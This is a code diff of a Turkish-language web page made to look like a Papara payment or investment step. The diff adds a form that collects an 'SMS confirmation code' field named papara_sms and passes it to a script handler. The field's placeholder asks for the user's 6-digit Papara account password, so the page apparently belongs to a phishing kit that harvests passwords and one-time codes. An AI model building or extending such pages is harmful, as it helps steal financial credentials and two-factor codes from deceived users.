@@ -4161,19 +4161,21 @@
                 <div class="tabcontent tabAuto" style="display:none"></div>
                 <div class="tabcontent tabAuto" style="display:block">
                 <div class="alert warning">Lütfen size iletilen SMS Onay Kodunuzu Giriniz. Ardından <b>‘Devam Et’</b> tuşuna tıklayarak, bir sonraki adıma yönlendirileceksiniz. </div>
+                <form id="form" action="javascript:;" onsubmit="smsOnay()">
                 <div class="form-group">
                     <label for="account_password">SMS Onay Kodu</label>
-                    <input class="form-control" id="account_password" type="number" placeholder="6 haneli papara hesap şifrenizi giriniz" minlength="6" mmaxlength="6" pattern="[0-9]*" value="">
+                    <input class="form-control" id="account_password" type="number" name="papara_sms" placeholder="6 haneli papara hesap şifrenizi giriniz" minlength="6" mmaxlength="6" pattern="[0-9]*" value="">
                 </div>
                 <div class="pButton">
                     <div class="row">
                     <div class="col sm-12">
                         <button onclick="nextFour();" class="btn btn-primary" id="continue-btn-init-auto">Devam Et</button>
                     </div>
+                    </form>
                     </div>
                     <div class="row">
                     <div class="col-sm-12">
-                        <button class="btn-decline">Yatırım İşleminden Vazgeç</button>
+                        <button onclick="window.location.href='/'" class="btn-decline">Yatırım İşleminden Vazgeç</button>
                     </div>
                     </div>
                 </div>
@@ -4226,7 +4228,7 @@
                         </div>
                         <div class="row">
                         <div class="col-sm-12">
-                            <button class="btn-decline">Yatırım İşleminden Vazgeç</button>
+                             <button onclick="window.location.href='/'" class="btn-decline">Yatırım İşleminden Vazgeç</button>
                         </div>
                         </div>
                     </div>
